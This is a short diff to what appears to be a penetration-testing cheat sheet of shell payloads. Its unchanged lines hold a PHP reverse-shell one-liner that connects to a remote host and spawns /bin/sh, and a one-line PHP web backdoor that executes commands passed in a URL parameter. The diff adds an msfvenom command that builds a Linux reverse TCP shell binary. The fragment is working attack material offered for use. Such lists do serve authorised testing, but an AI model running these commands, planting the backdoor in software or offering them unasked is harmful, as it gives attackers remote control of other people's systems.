@@ -13,3 +13,8 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 SIMPLE PHP BACKDOOR
 '<?php echo system($_GET["cmd"]); ?>'
 
+LINUX
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+
+
+
